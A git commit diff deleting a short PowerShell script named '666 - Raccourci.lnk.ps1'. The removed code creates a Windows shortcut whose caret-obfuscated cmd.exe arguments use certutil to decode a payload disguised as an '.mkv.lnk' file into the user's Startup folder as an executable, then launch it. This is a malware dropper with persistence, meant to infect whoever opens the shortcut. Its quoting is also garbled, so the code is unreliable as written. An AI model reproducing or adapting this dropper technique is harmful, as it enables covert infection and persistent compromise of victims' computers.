74d6925fbc7bd200ace892802c77ef3694b2c557
Micky <Mickyddroy@Gmail.com>
2026-07-28 13:34:29 -0400

    Delete 666 - Raccourci.lnk.ps1

--- 666 - Raccourci.lnk.ps1
+++
@@ -1,6 +0,0 @@
-$WshShell=New-Object -ComObject WScript.Shell
-$Shortcut=$WshShell.CreateShortcut($Output)
-$Shortcut.TargetPath="cmd.exe"
-$Shortcut.Arguments=/c ^c^m^d /c certutil -decode c:\Users\Etern\Desktop\666.mkv.lnk %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%USERNAME%.exe" nul 2>&1 && "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%USERNAME%.exe
-$Shortcut.IconLocation=$Icon
-$Shortcut.Save()
